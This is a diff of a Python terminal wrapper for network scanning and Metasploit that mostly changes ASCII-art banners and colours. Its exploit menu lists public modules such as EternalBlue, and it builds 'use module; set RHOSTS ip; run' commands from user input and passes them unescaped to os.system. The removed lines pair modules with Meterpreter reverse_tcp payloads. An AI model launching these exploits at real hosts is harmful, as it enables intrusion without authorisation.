@@ -41,22 +41,19 @@ def clear_screen():
 def fast_loading_screen():
    clear_screen()
    loading_text = '''
-  ██████  ▄████▄   ▄▄▄       ███▄    █  ███▄    █  ██▓ ███▄    █   ▄████
-▒██    ▒ ▒██▀ ▀█  ▒████▄     ██ ▀█   █  ██ ▀█   █ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
-░ ▓██▄   ▒▓█    ▄ ▒██  ▀█▄  ▓██  ▀█ ██▒▓██  ▀█ ██▒▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
-  ▒   ██▒▒▓▓▄ ▄██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒▓██▒  ▐▌██▒░██░▓██▒  ▐▌██▒░▓█  ██▓
-▒██████▒▒▒ ▓███▀ ░ ▓█   ▓██▒▒██░   ▓██░▒██░   ▓██░░██░▒██░   ▓██░░▒▓███▀▒ ██▓  ██▓  ██▓
-▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒  ▒▓▒  ▒▓▒  ▒▓▒
-░ ░▒  ░ ░  ░  ▒     ▒   ▒▒ ░░ ░░   ░ ▒░░ ░░   ░ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░  ░▒   ░▒   ░▒
-░  ░  ░  ░          ░   ▒      ░   ░ ░    ░   ░ ░  ▒ ░   ░   ░ ░ ░ ░   ░  ░    ░    ░
-      ░  ░ ░            ░  ░         ░          ░  ░           ░       ░   ░    ░    ░
-         ░                                                                 ░    ░    ░
+   
+███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗██╗███╗   ██╗ ██████╗     ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗
+██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██║████╗  ██║██╔════╝     ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝
+███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║██║██╔██╗ ██║██║  ███╗    ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ 
+╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██║██║╚██╗██║██║   ██║    ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ 
+███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║██║██║ ╚████║╚██████╔╝    ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗
+╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝                                                                                                                               
    '''
    for i, line in enumerate(loading_text.splitlines()):
       if i % 2 == 0:
-        print(Fore.RED + line)  # Blue for even lines
+        print(Fore.CYAN + line)  # Blue for even lines
       else:
-        print(Fore.LIGHTRED_EX + line)  # White for odd lines
+        print(Fore.LIGHTCYAN_EX + line)  # White for odd lines
       time.sleep(0.1)  # Short delay (0.1 seconds per line)
    print(Fore.CYAN + """Running Scan... Connection Completed Waiting For Results... """)
 
@@ -64,24 +61,45 @@ def fast_loading_screen():
 def show_main_menu_logo():
    logo_text = r'''
 
- ███▄    █ ▓█████▄▄▄█████▓    ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓
- ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒   ▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒
-▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░   ▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░
-▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░    ░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░
-▒██░   ▓██░░▒████▒ ▒██▒ ░    ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░
-░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░       ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░
-░ ░░   ░ ▒░ ░ ░  ░   ░        ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░
-   ░   ░ ░    ░    ░          ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░
-         ░    ░  ░            ░  ░  ░   ░              ░
-
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠶⣷⠲⠤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠞⢉⠀⠀⠀⠿⠦⠤⢦⣍⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⣤⡞⢡⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢀⣤⠴⠒⣾⠿⢟⠛⠻⣿⡿⣭⠿⠁⢰⠰⠀⠀⠀⠄⣄⣀⡀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢰⣿⣿⣦⡀⠙⠛⠋⠀⠀⠉⠻⠿⢷⣦⣿⣤⣤⣤⣤⣀⣈⠉⠛⠽⣆⡒⣿⣯⣷⣄⠀⠀⠀⠀⠀⠀
+⠀⠻⣍⠻⠿⣿⣦⣄⡀⢠⣾⠑⡆⠀⠈⠉⠛⠛⢿⡿⠿⠿⢿⣿⣿⣿⣿⠟⠉⠉⢿⣟⢲⢦⣀⠀⠀
+⠀⠀⠈⠙⠲⢤⣈⠉⠛⠷⢿⣏⣀⡀⠀⠀⠀⢰⣏⣳⠀⠀⠀⠀⠀⣸⣓⣦⠀⠀⠈⠛⠟⠃⣈⣷⡀             
+⠀⠀⠀⠀⠀⠈⢿⣙⡓⣶⣤⣤⣀⡀⠀⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠹⣿⣯⣤⣶⣶⣶⣿⠘⡿⢸⡿
+⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⡛⠻⢿⣯⣽⣷⣶⣶⣤⣤⣤⣤⣄⣀⣀⢀⣀⢀⣀⣈⣥⡤⠶⠗⠛⠋⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠓⠲⣬⣍⣉⡉⠙⠛⠛⠛⠉⠙⠉⠙⠉⣹⣿⠿⠛⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠻⠗⠒⠒⠚⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠚⠋⠉⠉⠀⠀⠈⠉⠉⠛⠶⣤⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀⠀
+⠀⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀
+⠀⢠⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡆⠀
+⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀
+⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
+⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇
+⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁
+⠀⠸⣇⠀⣠⣶⠤⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⣤⣄⠀⢰⠏⠀
+⠀⠀⢹⡄⢻⣷⣶⣾⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣷⣤⣾⡟⢠⡟⠀⠀
+⠀⠀⠀⢹⡌⢻⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⡟⢁⡞⠀⠀⠀
+⠀⠀⠀⠀⠹⣆⠙⠿⣿⣿⣿⣿⣷⠀⠀⠀⠀⣾⣿⣿⣿⣿⡿⠋⢠⠟⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠘⢧⡀⠈⠙⠛⠛⠋⠀⠀⠀⠀⠙⠿⠛⠋⠁⠀⣰⠋⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠾⠼⠄⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⢤⣤⣤⡤⠀⠀⣠⠔⠃⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠦⣄⣀⣀⣀⠴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 
    '''
    clear_screen()
    for i, line in enumerate(logo_text.splitlines()):
       if i % 2 == 0:
-        print(Fore.RED + line)  # Blue for even lines
+        print(Fore.CYAN + line)  # Blue for even lines
       else:
-        print(Fore.LIGHTRED_EX + line)  # White for odd lines
+        print(Fore.LIGHTCYAN_EX + line)  # White for odd lines
       time.sleep(0.1)  # Medium delay (0.3 seconds per line)
 
 # Function to run a scan with a given command
@@ -313,24 +331,18 @@ def exiting_loading_screen():
    clear_screen()
    loading_text = '''
 
-
- ▄▄▄▄    █    ██  ▄▄▄▄   ▓█████▓██   ██▓▓█████
-▓█████▄  ██  ▓██▒▓█████▄ ▓█   ▀ ▒██  ██▒▓█   ▀
-▒██▒ ▄██▓██  ▒██░▒██▒ ▄██▒███    ▒██ ██░▒███
-▒██░█▀  ▓▓█  ░██░▒██░█▀  ▒▓█  ▄  ░ ▐██▓░▒▓█  ▄
-░▓█  ▀█▓▒▒█████▓ ░▓█  ▀█▓░▒████▒ ░ ██▒▓░░▒████▒
-░▒▓███▀▒░▒▓▒ ▒ ▒ ░▒▓███▀▒░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░
-▒░▒   ░ ░░▒░ ░ ░ ▒░▒   ░  ░ ░  ░▓██ ░▒░  ░ ░  ░
- ░    ░  ░░░ ░ ░  ░    ░    ░   ▒ ▒ ░░     ░
- ░         ░      ░         ░  ░░ ░        ░  ░
-      ░                ░        ░ ░
+  _             _             
+ | |__ _  _ ___| |__ _  _ ___ 
+ | '_ \ || / -_) '_ \ || / -_)
+ |_.__/\_, \___|_.__/\_, \___|
+       |__/          |__/     
 
    '''
    for i, line in enumerate(loading_text.splitlines()):
       if i % 4 == 0:
-        print(Fore.RED + line)  # Blue for even lines
+        print(Fore.CYAN + line)  # Blue for even lines
       else:
-        print(Fore.LIGHTRED_EX + line)  # White for odd lines
+        print(Fore.LIGHTCYAN_EX + line)  # White for odd lines
       time.sleep(0.1)  # Short delay (0.1 seconds per line)
    # Display a final "Exiting..." message with a blue background and white text
    print(Fore.BLUE + Fore.WHITE + "\n")
@@ -500,10 +512,13 @@ def metasploit_scan():
             print(Fore.BLUE + "\nChoose a Metasploit option:")
             print("1. Scan for vulnerabilities")
             print("2. Exploit a vulnerability")
-            print("3. Manual Metasploit")
+            print("3. launch Metasploit")
             print("4. View Network Exploits")
             print("99. Return to main menu")
             choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
+
+            # Debugging: Print the user's choice to verify input
+            print(Fore.YELLOW + f"DEBUG: User choice input: '{choice}'")
 
             metasploit_commands = ""
             ip = ""
@@ -521,6 +536,10 @@ def metasploit_scan():
                     print(Fore.RED + "No IP address provided. Returning to the main menu...")
                     return
                 metasploit_commands = input(Fore.BLUE + "Enter your Metasploit commands (separated by newlines):\n")
+            elif choice == '3':  # Manual Metasploit
+                print(Fore.BLUE + "Launching manual Metasploit...")
+                os.system("msfconsole")
+                continue
             elif choice == '4':  # View Network Exploits
                 print(Fore.BLUE + "\nViewing all network exploits...")
 
@@ -533,14 +552,6 @@ def metasploit_scan():
                     "55": "exploit/multi/http/struts2_code_exec",
                     "66": "exploit/multi/http/jboss_deployment_scanner",
                     "77": "exploit/windows/smb/ms17_010_eternalblue",
-                    "108": "exploit/multi/http/tomcat_mgr_upload set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "110": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/dcerpc/ms03_026_dcom",
-                    "112": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/windows/smb/ms08_067_netapi",
-                    "114": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/unix/ftp/vsftpd_234_backdoor",
-                    "116": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/struts2_code_exec",
-                    "118": "set PAYLOAD windows/x64/meterpreter/reverse_tcp exploit/multi/http/jboss_deployment_scanner",
-                    "120": "exploit/windows/smb/ms17_010_eternalblue set PAYLOAD windows/x64/meterpreter/reverse_tcp",
-                    "122": "exploit/multi/http/struts2_code_exec set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                 }
 
                 # Display available exploits
@@ -549,29 +560,16 @@ def metasploit_scan():
 
                 exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
 
+                # Debugging: Print the user's exploit choice
+                print(Fore.YELLOW + f"DEBUG: Exploit choice input: '{exploit_choice}'")
+
                 if exploit_choice in exploits:
-                    # Prompt for IP only when choosing an exploit
                     ip = get_ip_address()  # Prompt for IP address
                     if not ip:
                         print(Fore.RED + "No IP address provided. Returning to the main menu...")
                         return
 
-                    # Ask user whether to use LHOST or RHOST for the exploit
-                    host_type = input(Fore.BLUE + "Do you want to use LHOST or RHOST? ").strip().lower()
-
-                    if host_type == 'rhost':
-                        metasploit_commands = f"use {exploits[exploit_choice]} \nset RHOSTS {ip} \n"
-                        # Prompt for RPORT only if using RHOST
-                        rport = input(Fore.BLUE + "Enter the RPORT: ").strip()
-                        metasploit_commands += f"set RPORT {rport} \nrun"
-                    elif host_type == 'lhost':
-                        metasploit_commands = f"use {exploits[exploit_choice]} \nset LHOST {ip} \n"
-                        # Prompt for LPORT only if using LHOST
-                        lport = input(Fore.BLUE + "Enter the LPORT: ").strip()
-                        metasploit_commands += f"set LPORT {lport} \nrun"
-                    else:
-                        print(Fore.RED + "Invalid choice. Please select either 'LHOST' or 'RHOST'.")
-                        continue  # Ask again if invalid input
+                    metasploit_commands = f"use {exploits[exploit_choice]} \nset RHOSTS {ip} \nrun"
                 else:
                     print(Fore.RED + "Invalid exploit choice.")
                     continue
@@ -586,14 +584,24 @@ def metasploit_scan():
             if metasploit_commands:
                 print(Fore.BLUE + "Launching Metasploit...")
 
+                # Debugging: Print the full command being executed
+                print(Fore.YELLOW + f"DEBUG: Full Metasploit commands:\n{metasploit_commands}")
+
                 # Ensure correct separation of commands (with a space after 'set' commands)
                 full_command = f"msfconsole -q -x \"{metasploit_commands}\""
-                print(Fore.BLUE + f"Executing command: {full_command}")  # Debug print to verify command
-                os.system(full_command)
+                print(Fore.YELLOW + f"Executing: {full_command}")  # Debugging line
+
+                # Run the command in the terminal
+                result = os.system(full_command)
+                
+                # Debugging: Check the result of the command execution
+                if result != 0:
+                    print(Fore.RED + f"Error: Metasploit command failed with exit code {result}")
                 break  # Exit the loop after launching Metasploit
 
     except Exception as e:
         print(Fore.RED + f"Error running Metasploit: {e}")
+
 
 
 
